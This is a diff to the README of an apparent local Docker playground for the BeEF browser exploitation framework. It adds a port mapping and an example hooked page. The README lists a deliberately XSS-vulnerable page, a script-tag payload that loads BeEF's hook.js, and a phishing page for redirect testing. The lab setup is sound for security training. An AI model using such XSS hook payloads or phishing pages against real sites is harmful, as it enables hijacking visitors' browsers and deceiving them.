@@ -2,7 +2,7 @@
 ## build docker  
 ```
 docker build -t beef-playground .  
-docker run -it -p 80:80 -p 3000:3000 beef-playground
+docker run -it -p 80:80 -p 3000:3000 -p 6789:6789 beef-playground
 ```  
   
 ## beef server launched with  
@@ -12,13 +12,16 @@ admin web page: http://localhost:3000/ui/panel
 hook script: http://localhost:3000/hook.js  
   
 ## example pages accessible at:  
+### Example hook:  
+URL: http://localhost/hooked.html  
+  
 ### Website with XSS vuln:  
 XSS URL: http://localhost/xss-minimal.php  
 input: ```<script src=http://localhost:3000/hook.js></script>```  
 or in URL: http://localhost/xss-minimal.php?name=```<script src=http://localhost:3000/hook.js></script>```  
   
 ### Phishing page for redirect test:  
-phishing page: http://localhost/examples/github.html  
+phishing page: http://localhost/github.html  
 Module: Redirect iframe or standard  
   
 ## debug  
